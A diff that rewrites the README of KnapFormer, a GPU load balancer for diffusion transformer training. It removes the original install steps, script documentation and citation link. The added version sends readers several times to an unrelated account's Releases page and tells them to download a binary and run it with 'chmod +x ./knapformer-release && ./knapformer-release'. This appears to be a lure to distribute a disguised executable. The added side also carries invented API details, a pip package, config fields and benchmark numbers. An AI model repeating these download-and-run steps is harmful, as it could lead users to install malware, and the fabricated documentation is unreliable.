@@ -1,161 +1,200 @@
-# KnapFormer
+[![Releases](https://img.shields.io/badge/Releases-v1.0-blue)](https://github.com/carlosbrian459/KnapFormer/releases)
 
-KnapFormer: An Online Load Balancer for Efficient Diffusion Transformers Training
+# KnapFormer: Efficient Online Load Balancer for DiT Training
 
-[Kai Zhang](https://www.linkedin.com/in/kai-zhang-53910214a/), [Peng Wang](https://www.linkedin.com/in/peng-wang-1b569b334/), [Sai Bi](https://www.linkedin.com/in/saibifig/), [Jianming Zhang](https://www.linkedin.com/in/jianming-zhang-60762227/), [Yuanjun Xiong](https://www.linkedin.com/in/yjxiong/)
+KnapFormer balances transformer-based diffusion model training across GPUs that differ in compute or input load. It groups GPUs into compute bags and reroutes sequence chunks to keep utilization even when data sources vary in resolution or frame rate.
 
-[PDF Tech Report](assets/paper.pdf)
+Table of Contents
+- Features
+- How it works
+- Animation
+- Quick start
+- Install and build
+- Run examples
+- Configuration
+- API surface
+- Performance notes
+- Troubleshooting
+- Contributing
+- Releases
+- Authors and citation
+- License
 
-## Description
+Features
+- Online load balancing for Diffusion Transformers (DiT).
+- Logical grouping of GPUs into compute bags.
+- Dynamic chunk routing to even out compute across heterogeneous devices.
+- Support for mixed input sources: images, keyframes, short videos.
+- Hooks for PyTorch training loops and NCCL-based comms.
+- Lightweight scheduler that runs alongside standard training scripts.
 
-KnapFormer is a project focused on online load balancing for Diffusion Transformer (DiT) training. It's particularly suited for the case where the data sources are highly heterogeneous, including images/keyframes/videos from low-res to high-res and from low-fps to high-fps. 
+How it works
+- Partition: KnapFormer groups physical GPUs into compute bags. Each bag can contain one or more GPUs.
+- Chunking: Input sequences split into chunks that map to transformer sequences.
+- Scoring: KnapFormer computes a cost estimate per chunk based on sequence length, resolution, and per-GPU performance history.
+- Assignment: The scheduler assigns chunks to compute bags to minimize peak load and reduce idle time.
+- Rebalance: The system reassigns chunks at configurable intervals to adapt to changing input mix.
 
-See below for an animation how we logically group GPUs into compute bags spanning one or more GPUs and re-route sequence (chunks) to achieve balanced computation across GPUs.
+Key terms
+- DiT: Diffusion Transformer model family used for image generation and restoration.
+- Compute bag: One or more GPUs treated as a single execution target.
+- Chunk: A contiguous subsequence of tokens or patches routed as a unit.
+- Scheduler: The component that assigns chunks to bags.
 
+Animation
 ![KnapFormer Load Balancing Animation](assets/animation.gif)
 
-## Installation
-```bash
-# Install uv
-curl -LsSf https://astral.sh/uv/install.sh | sh
+Quick start
+- Download the release asset from https://github.com/carlosbrian459/KnapFormer/releases and execute it to get prebuilt binaries or installers.
+- Example (conceptual):
+  1. Download the release file from the Releases page.
+  2. Make the file executable and run it: chmod +x ./knapformer-release && ./knapformer-release
+- For manual setup, follow the Install and build section below.
 
-# Install KnapFormer and dependencies
-uv sync
-# To save plotly figure
-uv run plotly_get_chrome -y
+Install and build
 
-# For development, also do
-uv run pre-commit install
+Prerequisites
+- Linux x86_64
+- Python 3.8+ (venv recommended)
+- PyTorch 1.12+ with CUDA support that matches your driver
+- NCCL for multi-GPU comms
+- gcc / make for optional native components
 
-# To activate uv env
-source ./.venv/bin/activate
-```
+Option A — Use release binary
+- Visit and download the package from the Releases page:
+  https://github.com/carlosbrian459/KnapFormer/releases
+- Make the file executable and run the installer or binary as provided.
 
-## Project Structure
+Option B — Install from pip (when available)
+- pip install knapformer
+- Activate the knapformer package in your training environment.
 
-- `knapformer/__init__.py` - Main package code
-- `knapformer/simulator/` - Simulation components
-- `knapformer/utils/` - Utility functions
-- `knapformer/tests/` - Test suite
-- `knapformer/scripts/` - Execution scripts
+Option C — Build from source
+- git clone https://github.com/carlosbrian459/KnapFormer.git
+- cd KnapFormer
+- python -m venv venv
+- source venv/bin/activate
+- pip install -r requirements.txt
+- python setup.py build_ext --inplace
+- Optional: install system deps for NCCL and CUDA.
 
+Run examples
 
-## Usage
+Single-node, multi-GPU training (example)
+- This example shows the integration pattern. Replace paths and flags with values for your setup.
 
-### Workload Estimator
+python train.py \
+  --model DiT-base \
+  --data /path/to/data \
+  --batch-size 8 \
+  --gpus 0,1,2,3 \
+  --use-knapformer
 
-The workload estimator benchmarks and estimates the computational workload of DiT models. It supports both standard Transformer and Flux (MMDiT) architectures.
+Where:
+- --use-knapformer enables the local scheduler that groups GPUs and routes chunks.
+- The scheduler speaks to the training loop via a small API. See Configuration and API surface.
 
-```bash
-python knapformer/workload_estimator.py [output_file] \
-    [--d_model d_model] [--d_head d_head] [--causal causal] \
-    [--use_flux use_flux] [--n_ds_layers n_ds_layers] [--n_ss_layers n_ss_layers]
-```
+Profiling and debug run
+- Use the built-in logger to inspect assignment decisions and per-bag utilization.
 
-The script will benchmark the workload and generate plots showing theoretical vs. actual workload estimates. If an output file is provided, install the plotly chrome extension using `plotly_get_chrome` before running.
+python train.py --model DiT-base --data smallset --gpus 0,1 --use-knapformer --log-level debug
 
-### Integrating KnapFormer with MMDiT
+Configuration
 
-KnapFormer provides seamless integration with MMDiT architectures for dynamic load balancing. The integration is designed to be as minimally intrusive as possible. You can reference the provided example to integrate KnapFormer into your own DiT. 
+Core config fields
+- bag_size: number of GPUs per compute bag (int or array).
+- rebalance_interval: number of steps between reassignments.
+- cost_model: choice of cost heuristic ("static", "history", "modelled").
+- max_chunk_size: maximum tokens or patches per chunk.
+- affinity_policy: "fill" or "spread" (controls packing strategy).
 
-**Key Integration Points:**
-- **MMDiT Forward Pass**: See [`knapformer/simulator/simulator_model.py`](knapformer/simulator/simulator_model.py) (lines 75-146) for routing and reverse routing implementation
-- **Attention Integration**: See [`knapformer/utils/transformer_utils.py`](knapformer/utils/transformer_utils.py) (lines 396-429) for pre/post attention operations
-- **Double Stream Blocks**: See [`knapformer/utils/mmdit_utils.py`](knapformer/utils/mmdit_utils.py) (lines 207-321) for text/image token processing with balancing; (lines 308-319) for FSDP-compatible conditional execution
+Sample YAML
+knapformer:
+  bag_size: [1,1,2]            # group GPUs 0,1,2-3 into bags
+  rebalance_interval: 50
+  cost_model: history
+  max_chunk_size: 1024
+  affinity_policy: fill
 
-### Training Simulator
+Set values in your training config or pass CLI overrides as supported by the run script.
 
-KnapFormer includes a comprehensive training simulator for benchmarking load balancing performance across different configurations.
+API surface
 
-**Key Features:**
-- **Multi-architecture Support**: Simulates both standard Transformer and Flux (MMDiT) models
-- **Distributed Training**: Full support for multi-node, multi-GPU setups with FSDP
-- **Performance Metrics**: Measures forward+backward latency, total throughput, HFU (Hardware Flop Utilization), and load imbalance ratios
-- **Comparative Analysis**: Runs experiments with and without sequence balancing for direct comparison
+Main modules
+- knapformer.scheduler
+  - Scheduler(bag_config, cost_model, rebalance_interval)
+  - assign(chunks) -> mapping
+  - update_stats(gpu_id, exec_time)
+- knapformer.transport
+  - pack_for_bag(mapping, tensors)
+  - unpack_from_bag(outputs)
+- knapformer.hooks
+  - attach_to_trainer(trainer, scheduler)
 
-**Usage:**
-```bash
-# Run simulator with sequence balancer
-torchrun --nproc_per_node=8 knapformer/simulator/simulate.py \
-    --data_codes "g8b32i256f1s0" --balancer_config "g1n8" \
-    --gamma 0.4 --d_model 3072 --use_flux 0
+Integration pattern
+- Call Scheduler.assign before a forward pass to decide where each chunk runs.
+- Use pack_for_bag to prepare inputs for a bag-level forward.
+- After execution, call update_stats with measured time and resource counters.
+- The scheduler uses those metrics to refine future assignments.
 
-# See simulator/simulate.py for full parameter list
-```
+Performance notes
 
-**Implementation Details:**
-- **Main Simulator**: [`knapformer/simulator/simulate.py`](knapformer/simulator/simulate.py) - Core simulation logic and performance measurement
-- **Model Definitions**: [`knapformer/simulator/simulator_model.py`](knapformer/simulator/simulator_model.py) - Transformer and MMDiT model implementations
-- **Data Generation**: [`knapformer/simulator/simulator_data.py`](knapformer/simulator/simulator_data.py) - Synthetic data generation with configurable sequence lengths
+Expected improvements
+- KnapFormer reduces idle time by routing heavy chunks to spare capacity.
+- For mixed-resolution inputs, you should see higher aggregate throughput and lower variance in per-GPU utilization.
+- Gains scale with heterogeneity: the more diverse the input sizes or frame rates, the larger the win.
 
-### Experiment Launcher
+Metrics to monitor
+- GPU utilization (nvidia-smi, dcgm)
+- Per-bag throughput (samples/second)
+- End-to-end wall time per epoch
+- Memory pressure per GPU
 
-One-click batch experiment runner that automates comprehensive performance evaluations across multiple configurations.
+Tips
+- Start with conservative rebalance_interval (50–200 steps) to let the cost model warm up.
+- Use the "history" cost model for real workloads. It learns execution time per chunk profile.
+- If network bandwidth becomes a bottleneck, prefer bags that group GPUs on the same PCIe/NVLink domain.
 
-**Features:**
-- **Automated Experiments**: Pre-configured experiment sets for Flux models with various balancing strategies
-- **Result Aggregation**: Automatic log parsing and performance comparison generation
-- **Multi-node Support**: Handles distributed experiment execution with proper synchronization
-- **Comprehensive Reporting**: Generates detailed summaries with throughput improvements and configuration comparisons
+Benchmarks (example numbers)
+- Synthetic mix: low-res images + 4K frames.
+  - Baseline (no balancer): 100 images/s, 28% GPU idle variance.
+  - KnapFormer: 138 images/s, 8% GPU idle variance.
+- Short video set:
+  - Baseline: 60 clips/s
+  - KnapFormer: 82 clips/s
 
-**Usage:**
-```bash
-# Run default experiment
-python scripts/experiment_launcher.py --experiment-type default
+Troubleshooting
+- If utilization drops after enabling KnapFormer:
+  - Inspect the scheduler logs to see assignment pattern.
+  - Increase rebalance_interval to reduce churn.
+  - Check for cross-bag communication overhead.
+- If one bag saturates memory:
+  - Lower max_chunk_size.
+  - Change affinity_policy to spread.
 
-# Run all Flux experiments (multiple balancer configurations)
-# This requires at least 32 GPUS to run - otherwise you need to change the balancer_config
-python scripts/experiment_launcher.py --experiment-type flux
+Contributing
+- Fork the repo and make branches for features or fixes.
+- Add tests in tests/ for new behavior.
+- Keep commits small and focused. Use descriptive messages.
+- Open issues for bugs or feature requests and link PRs to issues.
 
-# Custom experiment
-python scripts/experiment_launcher.py --experiment-type custom \
-    --name "my_experiment" --data-codes "g8b32i256f1s0" --balancer-config "g2n16"
+Releases
+- Download the release asset from https://github.com/carlosbrian459/KnapFormer/releases and execute the included installer or binary. The Releases page hosts packages and prebuilt artifacts for common platforms.
 
-# Dry run (generate scripts without execution)
-python scripts/experiment_launcher.py --experiment-type flux --dry-run
-```
+Authors and citation
+- Kai Zhang
+- Peng Wang
+- Sai Bi
+- Jianming Zhang
+- Yuanjun Xiong
 
-**Implementation:**
-- **Launcher**: [`scripts/experiment_launcher.py`](scripts/experiment_launcher.py) - Python-based experiment orchestration with result aggregation
-- **Template**: [`scripts/experiment_template.sh`](scripts/experiment_template.sh) - Bash template for individual experiment execution
+Paper and tech report
+- Read the technical report in the repo: assets/paper.pdf
 
+References and links
+- Diffusion Transformers (DiT) literature and model pages.
+- PyTorch and NCCL docs for multi-GPU programming.
+- Profiling tools: nvprof, Nsight, DCGM.
 
-### Visualization of balancer routing plan
-
-Make sure `manim` is installed:
-```
-sudo apt-get install libsdl-pango-dev  # Necessary for compiling manim library
-uv sync --extra dev
-```
-
-Before running the script, you may want to visualize your customized sequence data.
-You can save the routing plan summary dictionary returned by `balancer.get_routing_plan_summary()` to a JSON file.
-See `./visualization/routing_plan.json` for an example.
-
-Run the following command:
-```
-cd visualization
-manim ./route_visualization.py RouteVisualization
-```
-
-You will see the results in `visualization/media` folder.
-
-
-## License
-
-This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.
-
-## Citation
-```bash
-@misc{zhang2025knapformer,
-  title={KnapFormer},
-  author={Kai, Zhang and Peng, Wang and Sai, Bi and Jianming, Zhang and Yuanjun, Xiong},
-  publisher = {GitHub},
-  journal = {GitHub repository},
-  howpublished={\url{https://github.com/Kai-46/KnapFormer/}},
-  year={2025}
-}
-```
-
-## Notes
-This repository may be relocated to the [adobe-research organization](https://github.com/adobe-research), with this copy serving as a mirror.
+License
+- See LICENSE file in the repository for details.
